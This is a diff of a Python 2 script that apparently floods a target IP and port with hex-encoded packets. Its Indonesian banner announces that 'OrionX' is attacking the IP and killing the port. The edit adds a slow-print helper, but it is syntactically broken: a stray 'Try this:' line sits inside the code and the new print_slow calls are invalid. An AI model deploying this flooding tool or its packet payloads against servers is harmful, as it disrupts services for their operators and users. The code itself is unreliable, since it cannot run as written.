@@ -7,6 +7,14 @@ import time
 import os
 from termcolor import colored
 
+Try this:
+
+def print_slow(str):
+    for letter in str:
+        sys.stdout.write(letter)
+        sys.stdout.flush()
+        time.sleep(0.1)
+
 
 print colored("Sabar.....", ('red'))
 time.sleep(5)
@@ -30,9 +38,9 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                        ]
 
-print colored("##########################################", ('red'))
-print colored("OrionX Menyerang ip: %s Dan Membunuh Port: %s"%(orgip,port), ('red'))
-print colored("##########################################", ('red'))
+print_slow colored("##########################################", ('red'))
+print_slow colored("OrionX Menyerang ip: %s Dan Membunuh Port: %s"%(orgip,port), ('red'))
+print_slow colored("##########################################", ('red'))
 
             
 
